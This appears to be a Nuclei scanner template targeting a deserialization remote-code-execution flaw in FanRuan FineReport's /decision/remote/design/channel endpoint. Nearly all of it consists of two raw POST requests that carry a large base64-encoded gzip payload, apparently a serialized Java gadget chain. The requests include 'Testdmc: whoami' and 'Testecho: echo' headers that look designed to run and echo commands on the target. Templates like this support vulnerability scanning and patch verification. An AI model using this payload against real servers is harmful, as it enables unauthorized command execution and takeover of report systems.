id: fanruan-finereport-channel-rce

info:
  name: fanruan-finereport-channel-rce
  author: pphua
  severity: critical
  description: 帆软报表/webroot/decision/remote/design/channel反序列化漏洞
  reference:
  tags: fanruan,finereport,rce

http:
  - raw:
      - |
        POST /webroot/decision/remote/design/channel HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Testdmc: whoami
        Testecho: echo
        
        {{base64_decode("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")}}
        

      - |
        POST /decision/remote/design/channel HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Testdmc: whoami
        Testecho: echo
        
        {{base64_decode("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")}}

    matchers:
      - type: dsl
        dsl:
          - 'contains(all_headers,"Testdmc")'